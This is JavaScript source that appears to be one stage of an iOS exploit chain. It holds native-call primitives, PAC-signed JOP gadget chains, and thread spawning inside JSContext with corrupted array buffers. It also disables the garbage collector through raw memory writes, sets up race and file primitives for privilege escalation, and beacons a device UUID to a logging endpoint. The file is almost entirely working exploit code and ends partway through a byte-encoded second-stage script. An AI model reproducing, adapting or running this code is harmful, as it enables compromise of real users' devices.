globalThis.__LAB_DEVICE_UUID__="1CD3AADB5519D4988004AB9B1369B1FD";
(() => {
  try { func_offsets_array[0x2100] = 0x50; } catch (_m0) {}
  try { fcall_init(); func_offsets_array[0x2100] = 0x51; }
  catch (_m1) {
    try { func_offsets_array[0x2100] = 0x45; var _es1 = (_m1 && _m1.message) ? String(_m1.message) : String(_m1); for (var _ei1 = 0; _ei1 < 24 && _ei1 < _es1.length; _ei1++) func_offsets_array[0x2108 + _ei1] = _es1.charCodeAt(_ei1) & 0xff; } catch (_m2) {}
    throw _m1;
  }
  // === BEGIN LAB_PE_ALIVE ===
  try {
    var __peAliveOnce = false;
    // No BSD socket probes. Later (after Native) pe_alive_ping uses CFNetwork GET /log.html.
    var pe_alive_ping = function (tag) {
      try {
        if (__peAliveOnce && tag === "pe_fcall_ok") return;
        if (tag === "pe_fcall_ok") __peAliveOnce = true;
        if (typeof __labCfHttp === "function") {
          var uuid = "";
          try {
            var g = typeof globalThis !== "undefined" ? globalThis : null;
            if (g && g.__LAB_DEVICE_UUID__) uuid = String(g.__LAB_DEVICE_UUID__);
          } catch (_u) {}
          var text = "[pe] " + String(tag).substring(0, 80);
          var enc = "";
          for (var ci = 0; ci < text.length; ci++) {
            var c = text.charCodeAt(ci);
            if ((c >= 0x30 && c <= 0x39) || (c >= 0x41 && c <= 0x5a) || (c >= 0x61 && c <= 0x7a) || c === 0x2d || c === 0x2e || c === 0x5f || c === 0x7e)
              enc += text.charAt(ci);
            else if (c === 0x20) enc += "+";
            else {
              var hx = c.toString(16).toUpperCase();
              if (hx.length < 2) hx = "0" + hx;
              enc += "%" + hx;
            }
          }
          var q = "text=" + enc;
          if (uuid) q += "&deviceUUID=" + uuid;
          __labCfHttp("GET", "/log.html?" + q, null, false);
        }
      } catch (_e) {}
    };
    pe_alive_ping("pe_fcall_ok");
  } catch (_peAlive) {}
  // === END LAB_PE_ALIVE ===
  try { func_offsets_array[0x2100] = 0x52; } catch (_m3) {}
  let PAGE_SIZE = 0x4000n;
  let KERN_SUCCESS = 0n;
  let CALLOC = func_resolve("calloc");
  let MALLOC = func_resolve("malloc");
  let FREE = func_resolve("free");
  let MEMCPY = func_resolve("memcpy");
  let MEMSET = func_resolve("memset");
  let SLEEP = func_resolve("sleep");
  let USLEEP = func_resolve("usleep");
  let STRCMP = func_resolve("strcmp");
  let STRCPY = func_resolve("strcpy");
  let STRNCPY = func_resolve("strncpy");
  let SNPRINTF = func_resolve("snprintf");
  let PRINTF = func_resolve("printf");
  let ERRNO = func_resolve("errno");
  let CLOSE = func_resolve("close");
  let EXIT = func_resolve("exit");
  let GETCHAR = func_resolve("getchar");
  let GETPID = func_resolve("getpid");
  let SYSCALL = func_resolve("syscall");
  let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
  let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
  let MACH_ERROR_STRING = func_resolve("mach_error_string");
  let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
  let kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");
  function assert(a, b = "N/A") {
    if (!a) {
      throw new Error(`assert failed: ${b}`);
    }
  }
  function ERROR(a) {
    throw new Error(a);
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function mach_task_self() {
    return 0x203n;
  }
  function calloc(...args) {
    return fcall(CALLOC, ...args);
  }
  function malloc(...args) {
    return fcall(MALLOC, ...args);
  }
  function free(...args) {
    return fcall(FREE, ...args);
  }
  function memcpy(...args) {
    return fcall(MEMCPY, ...args);
  }
  function memset(...args) {
    return fcall(MEMSET, ...args);
  }
  function sleep(...args) {
    return fcall(SLEEP, ...args);
  }
  function usleep(...args) {
    return fcall(USLEEP, ...args);
  }
  function strcmp(...args) {
    return fcall(STRCMP, ...args);
  }
  function strcpy(...args) {
    return fcall(STRCPY, ...args);
  }
  function strncpy(...args) {
    return fcall(STRNCPY, ...args);
  }
  function snprintf(...args) {
    return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function printf(...args) {
    return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function close(...args) {
    return fcall(CLOSE, ...args);
  }
  function exit(...args) {
    return fcall(EXIT, ...args);
  }
  function getchar(...args) {
    return fcall(GETCHAR, ...args);
  }
  function getpid(...args) {
    return fcall(GETPID, ...args);
  }
  function syscall(num, ...args) {
    return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function mach_vm_allocate(...args) {
    return fcall(MACH_VM_ALLOCATE, ...args);
  }
  function mach_vm_deallocate(...args) {
    return fcall(MACH_VM_DEALLOCATE, ...args);
  }
  function mach_error_string(...args) {
    return fcall(MACH_ERROR_STRING, ...args);
  }
  function mach_port_allocate(...args) {
    return fcall(MACH_PORT_ALLOCATE, ...args);
  }
  let g_device_machine = 0n;
  function get_device_machine() {
    if (g_device_machine == 0n) {
      let utsname = calloc(256n, 5n);
      fcall(UNAME, utsname);
      g_device_machine = utsname + 256n * 4n;
    }
    return g_device_machine;
  }
  let OBJC_ALLOC = func_resolve("objc_alloc");
  let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
  let OBJC_GETCLASS = func_resolve("objc_getClass");
  let OBJC_MSGSEND = func_resolve("objc_msgSend");
  let SEL_REGISTERNAME = func_resolve("sel_registerName");
  let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
  let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
  let CFNUMBERCREATE = func_resolve("CFNumberCreate");
  let CFRELEASE = func_resolve("CFRelease");
  let CFSHOW = func_resolve("CFShow");
  let CFSTRINGCREATECOPY = func_resolve("CFStringCreateCopy");
  let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
  let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault").noPAC());
  let kCFStringEncodingUTF8 = 0x08000100n;
  let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
  let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();
  function CFDictionaryCreateMutable(...args) {
    return fcall(CFDICTIONARYCREATEMUTABLE, ...args);
  }
  function CFDictionarySetValue(...args) {
    return fcall(CFDICTIONARYSETVALUE, ...args);
  }
  function CFNumberCreate(...args) {
    return fcall(CFNUMBERCREATE, ...args);
  }
  function CFRelease(...args) {
    return fcall(CFRELEASE, ...args);
  }
  function CFShow(...args) {
    return fcall(CFSHOW, ...args);
  }
  function CFStringCreateCopy(...args) {
    return fcall(CFSTRINGCREATECOPY, ...args);
  }
  function CFStringCreateWithCString(...args) {
    return fcall(CFSTRINGCREATEWITHCSTRING, ...args);
  }
  function objc_alloc(class_obj) {
    return fcall(OBJC_ALLOC, class_obj);
  }
  function objc_alloc_init(class_obj) {
    return fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function objc_getClass(class_name) {
    return fcall(OBJC_GETCLASS, get_cstring(class_name));
  }
  function objc_msgSend(...args) {
    return fcall(OBJC_MSGSEND, ...args);
  }
  function sel_registerName(cstr) {
    return fcall(SEL_REGISTERNAME, cstr);
  }
  let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
  let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
  let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
  let selector_invoke = sel_registerName(get_cstring("invoke"));
  let selector_isFinished = sel_registerName(get_cstring("isFinished"));
  let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
  let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
  let selector_release = sel_registerName(get_cstring("release"));
  let selector_retainCount = sel_registerName(get_cstring("retainCount"));
  let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
  let selector_start = sel_registerName(get_cstring("start"));
  let invoke_class = objc_getClass("NSInvocation");
  let jsc_class = objc_getClass("JSContext");
  let nsthread_class = objc_getClass("NSThread");
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }
  let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
  let cfstr_control_array = create_cfstring(get_cstring("control_array"));
  let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
  let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
  let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
  let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
  let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
  let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
  function create_cfstring_copy(cfstring) {
    return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
  }
  function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);
  }
  function object_release(obj) {
    return objc_msgSend(obj, selector_release);
  }
  function objectForKeyedSubscript(obj, cfstr_key) {
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
  }
  function evaluateScript(obj, jscript) {
    return objc_msgSend(obj, selector_evaluateScript, jscript);
  }
  function methodSignatureForSelector(obj, sel) {
    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
  }
  function invocationWithMethodSignature(obj, sig) {
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
  }
  function setArgument_atIndex(obj, arg, idx) {
    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
  }
  function initWithTarget_selector_object(obj, target, sel, object) {
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
  }
  function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
  }
  function setup_fcall_jopchain() {
    let jsvm_fcall_buff = malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return {
      "jsvm_fcall_buff": jsvm_fcall_buff,
      "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
      "jsvm_fcall_args": jsvm_fcall_args
    };
  }
  let evaluateScript_invocation = 0n;
  function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
    if (typeof js_script_nsstring === "string") {
      js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
    } else if (typeof js_script_nsstring === "object") {
      js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
    } else {
      js_script_nsstring = create_cfstring_copy(js_script_nsstring);
    }
    let jop_chain_info = setup_fcall_jopchain();
    let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
    let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
    let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
    let ctx = objc_alloc_init(jsc_class);
    let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
    let isnan_func_addr = uread64(isnan_value + 0x8n);
    let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    evaluateScript(ctx, stage1_js);
    let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
    let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
    let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
    let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
    uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
    let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
    let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
    let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
    let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
    uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
    let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
    let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
    let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
    uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    uwrite64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
    let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
    memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE);
    uwrite64(new_func_offsets_buffer + 3n * 0x8n, target_thread_arg);
    uwrite64(new_func_offsets_buffer + 5n * 0x8n, jsvm_fcall_buff);
    uwrite64(new_func_offsets_buffer + 6n * 0x8n, jsvm_fcall_pc);
    uwrite64(new_func_offsets_buffer + 7n * 0x8n, jsvm_fcall_args);
    if (evaluateScript_invocation == 0n) {
      let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
      evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
      setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
    }
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);
    let nsthread = objc_alloc(nsthread_class);
    initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
    nsthread_start(nsthread);
    return {
      "thread_handle": nsthread,
      "js_ctx": ctx,
      "jop_chain_info": jop_chain_info,
      "js_script_nsstring": js_script_nsstring,
      "rw_array_buffer_bk": rw_array_buffer_bk,
      "control_array_buffer_bk": control_array_buffer_bk,
      "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
      "control_array_8_buffer_bk": control_array_8_buffer_bk
    };
  }
  function js_thread_join(js_thread) {
    let jop_chain_info = js_thread["jop_chain_info"];
    let js_ctx = js_thread["js_ctx"];
    let js_script_nsstring = js_thread["js_script_nsstring"];
    let nsthread = js_thread["thread_handle"];
    while (true) {
      let isFinished = objc_msgSend(nsthread, selector_isFinished);
      if (isFinished == 1n) {
        break;
      }
    }
    object_release(nsthread);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n, js_thread["control_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n, js_thread["rw_array_8_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n, js_thread["control_array_8_buffer_bk"]);
    let jsc_ref_count = object_retainCount(js_ctx);
    for (let i = 0n; i < jsc_ref_count; i++) {
      object_release(js_ctx);
    }
    CFRelease(js_script_nsstring);
    free(jop_chain_info["jsvm_fcall_buff"]);
  }
  let RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
  let VM_FLAGS_ANYWHERE = 1n;
  let VM_FLAGS_FIXED = 0n;
  let VM_FLAGS_OVERWRITE = 0x4000n;
  let VM_FLAGS_RANDOM_ADDR = 8n;
  let VM_INHERIT_NONE = 2n;
  let VM_PROT_DEFAULT = 3n;
  let PROT_READ = 0x1n;
  let PROT_WRITE = 0x2n;
  let MAP_SHARED = 0x1n;
  let AF_INET6 = 30n;
  let SOCK_DGRAM = 2n;
  let IPPROTO_ICMPV6 = 58n;
  let ICMP6_FILTER = 18n;
  let SEEK_SET = 0n;
  let _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
  let ACCESS = func_resolve("access");
  let CONFSTR = func_resolve("confstr");
  let FCNTL = func_resolve("fcntl");
  let FSYNC = func_resolve("fsync");
  let FILEPORT_MAKEFD = func_resolve("fileport_makefd");
  let FILEPORT_MAKEPORT = func_resolve("fileport_makeport");
  let FOPEN = func_resolve("fopen");
  let FCLOSE = func_resolve("fclose");
  let FWRITE = func_resolve("fwrite");
  let GETSOCKOPT = func_resolve("getsockopt");
  let LSEEK = func_resolve("lseek");
  let MACH_THREAD_SELF = func_resolve("mach_thread_self");
  let MEMMEM = func_resolve("memmem");
  let MEMSET_PATTERN8 = func_resolve("memset_pattern8");
  let OPEN = func_resolve("open");
  let PREADV = func_resolve("preadv");
  let PWRITEV = func_resolve("pwritev");
  let PWRITE = func_resolve("pwrite");
  let PREAD = func_resolve("pread");
  let READ = func_resolve("read");
  let SETSOCKOPT = func_resolve("setsockopt");
  let SOCKET = func_resolve("socket");
  let STRCAT = func_resolve("strcat");
  let STRSTR = func_resolve("strstr");
  let STRLEN = func_resolve("strlen");
  let STRNCMP = func_resolve("strncmp");
  let STRRCHR = func_resolve("strrchr");
  let PTHREAD_SELF = func_resolve("pthread_self");
  let PTHREAD_JOIN = func_resolve("pthread_join");
  let WRITE = func_resolve("write");
  let REMOVE = func_resolve("remove");
  let ARC4RANDOM = func_resolve("arc4random");
  let TASK_THREADS = func_resolve("task_threads");
  let THREAD_SUSPEND = func_resolve("thread_suspend");
  let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
  let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
  let MACH_VM_MAP = func_resolve("mach_vm_map");
  let MMAP = func_resolve("mmap");
  let MLOCK = func_resolve("mlock");
  let MUNLOCK = func_resolve("munlock");
  let UNAME = func_resolve("uname");
  let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
  let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
  let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
  let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
  function DUMP(addr, sz) {}
  function js_malloc(sz) {
    buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
    return uread64(mem.addrof(buff) + 0x10n);
  }
  function mach_thread_self() {
    return fcall(MACH_THREAD_SELF);
  }
  function pthread_getspecific(key) {
    return fcall(PTHREAD_GETSPECIFIC, key);
  }
  function pthread_self() {
    return fcall(PTHREAD_SELF);
  }
  function pthread_join(thr, val) {
    return fcall(PTHREAD_JOIN, thr, val);
  }
  function _NSGetExecutablePath(executable_path, length_ptr) {
    return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
  }
  function confstr(name, buf, len) {
    return fcall(CONFSTR, name, buf, len);
  }
  function strrchr(s, c) {
    return fcall(STRRCHR, s, c);
  }
  function strcat(s1, s2) {
    return fcall(STRCAT, s1, s2);
  }
  function strlen(s) {
    return fcall(STRLEN, s);
  }
  function strstr(s1, s2) {
    return fcall(STRSTR, s1, s2);
  }
  function strncmp(s1, s2, n) {
    return fcall(STRNCMP, s1, s2, n);
  }
  function socket(domain, type, protocol) {
    return fcall(SOCKET, domain, type, protocol);
  }
  function getsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(GETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function setsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(SETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function fileport_makeport(fd, port) {
    return fcall(FILEPORT_MAKEPORT, fd, port);
  }
  function fileport_makefd(port) {
    return fcall(FILEPORT_MAKEFD, port);
  }
  function memset_pattern8(buf, val, sz) {
    return fcall(MEMSET_PATTERN8, buf, val, sz);
  }
  function memmem(big, big_len, little, little_len) {
    return fcall(MEMMEM, big, big_len, little, little_len);
  }
  function access(path, mode) {
    return fcall(ACCESS, path, mode);
  }
  function open(path, mode) {
    return fcall(OPEN, path, mode);
  }
  function fopen(path, mode) {
    return fcall(FOPEN, path, mode);
  }
  function fclose(fd) {
    return fcall(FCLOSE, fd);
  }
  function fwrite(buf, sz, nitem, fd) {
    return fcall(FWRITE, buf, sz, nitem, fd);
  }
  function preadv(fildes, iov, iovcnt, offset) {
    return fcall(PREADV, fildes, iov, iovcnt, offset);
  }
  function pwritev(fildes, iov, iovcnt, offset) {
    return fcall(PWRITEV, fildes, iov, iovcnt, offset);
  }
  function pwrite(fildes, buff, size, offset) {
    return fcall(PWRITE, fildes, buff, size, offset);
  }
  function pread(fildes, buff, size, offset) {
    return fcall(PREAD, fildes, buff, size, offset);
  }
  function read(fd, buf, sz) {
    return fcall(READ, fd, buf, sz);
  }
  function write(fd, buf, sz) {
    return fcall(WRITE, fd, buf, sz);
  }
  function remove(path) {
    return fcall(REMOVE, path);
  }
  function arc4random() {
    return fcall(ARC4RANDOM);
  }
  function task_threads(task, thread_list_addr, thread_count_addr) {
    return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
  }
  function fcntl(fd, flag, value) {
    return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
  }
  function lseek(fildes, offset, whence) {
    return fcall(LSEEK, fildes, offset, whence);
  }
  function fsync(fd) {
    return fcall(FSYNC, fd);
  }
  function CFStringCreateWithCString(allocator, cstring, encoding) {
    return fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
  }
  function CFStringCreateCopy(allocator, cfstring) {
    return fcall(CFSTRINGCREATECOPY, allocator, cfstring);
  }
  function CFDictionarySetValue(dict, key, value) {
    return fcall(CFDICTIONARYSETVALUE, dict, key, value);
  }
  function CFNumberCreate(allocator, theType, valuePtr) {
    return fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
  }
  function IOSurfaceCreate(dict) {
    return fcall(IOSURFACECREATE, dict);
  }
  function IOSurfaceGetBaseAddress(surface) {
    return fcall(IOSURFACEGETBASEADDRESS, surface);
  }
  function IOSurfacePrefetchPages(surface) {
    return fcall(IOSURFACEPREFETCHPAGES, surface);
  }
  function CFRelease(obj) {
    return fcall(CFRELEASE, obj);
  }
  function CFShow(obj) {
    return fcall(CFSHOW, obj);
  }
  function mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry) {
    return fcall(MACH_MAKE_MEMORY_ENTRY_64, target_task, size, offset, permission, object_handle, parent_entry);
  }
  function mach_vm_map(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance) {
    return fcall(MACH_VM_MAP, target_task, address, size, mask, flags, object, offset, copy, cur_protection | max_protection << 32n, inheritance);
  }
  function mmap(addr, len, prot, flags, fd, offset) {
    return fcall(MMAP, addr, len, prot, flags, fd, offset);
  }
  function mlock(address, size) {
    return fcall(MLOCK, address, size);
  }
  function munlock(address, size) {
    return fcall(MUNLOCK, address, size);
  }
  function mach_port_deallocate(task, name) {
    return fcall(MACH_PORT_DEALLOCATE, task, name);
  }
  function mach_task_self() {
    return 0x203n;
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function disable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 0n);
  }
  function enable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 1n);
  }
  function disarm_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let m_threadGroup = uread64(heap + 0x198n);
    let threads = uread64(m_threadGroup);
    uwrite64(threads + 0x20n, 0x0n);
  }
  disable_gc();
  disarm_gc();
  enable_gc();
  let executable_name = 0n;
  let read_file_path = 0n;
  let write_file_path = 0n;
  let target_file_size = PAGE_SIZE * 0x2n;
  let oob_offset = 0x100n;
  let oob_size = 0xf00n;
  let n_of_oob_pages = 2n;
  let pc_address = new_bigint();
  let pc_size = 0n;
  let pc_object = new_bigint();
  let free_target = 0n;
  let free_target_size = 0n;
  let write_fd = 0n;
  let read_fd = 0n;
  let random_marker = arc4random() << 32n | arc4random();
  let wired_page_marker = arc4random() << 32n | arc4random();
  let free_thread_start_ptr = 0n;
  let free_target_sync_ptr = 0n;
  let free_target_size_sync_ptr = 0n;
  let target_object_sync_ptr = 0n;
  let target_object_offset_sync_ptr = 0n;
  let go_sync_ptr = 0n;
  let race_sync_ptr = 0n;
  let free_thread_jsthread = 0n;
  let free_thread_arg = 0n;
  function init_target_file() {
    let _CS_DARWIN_USER_TEMP_DIR = 65537n;
    read_file_path = calloc(1n, 1024n);
    write_file_path = calloc(1n, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
    strcat(read_file_path, get_cstring(`/${arc4random().hex()}`));
    strcat(write_file_path, get_cstring(`/${arc4random().hex()}`));
    create_target_file(read_file_path);
    create_target_file(write_file_path);
    read_fd = open(read_file_path, 0x2n);
    write_fd = open(write_file_path, 0x2n);
    LOG("[+] read_fd: " + read_fd.hex());
    LOG("[+] write_fd: " + write_fd.hex());
    remove(read_file_path);
    remove(write_file_path);
    fcntl(read_fd, 48n, 1n);
    fcntl(write_fd, 48n, 1n);
  }
  function pe_init() {
    init_target_file();
    if (executable_name == 0n) {
      let length = BigInt("0x1024");
      let executable_path = calloc(1n, length);
      _NSGetExecutablePath(executable_path, get_bigint_addr(length));
      executable_name = strrchr(executable_path, 0x2fn);
      if (executable_name != 0n) {
        executable_name = executable_name + 0x1n;
      } else {
        executable_name = executable_path;
      }
    }
    free_thread_arg = calloc(1n, PAGE_SIZE);
    LOG("[+] free_thread_arg: " + free_thread_arg.hex());
    free_thread_start_ptr = free_thread_arg;
    free_target_sync_ptr = free_thread_arg + 0x8n;
    free_target_size_sync_ptr = free_thread_arg + 0x10n;
    target_object_sync_ptr = free_thread_arg + 0x18n;
    target_object_offset_sync_ptr = free_thread_arg + 0x20n;
    go_sync_ptr = free_thread_arg + 0x28n;
    race_sync_ptr = free_thread_arg + 0x30n;
    let free_thread_js_data = new Uint8Array([102, 99, 97, 108, 108, 95, 105, 110, 105, 116, 40, 41, 59, 10, 108, 101, 116, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 32, 32, 32, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 67, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 82, 69, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 114, 101, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 69, 77, 67, 80, 89, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 34, 41, 59, 10, 10, 108, 101, 116, 32, 83, 76, 69, 69, 80, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 85, 83, 76, 69, 69, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 77, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 80, 89, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 80, 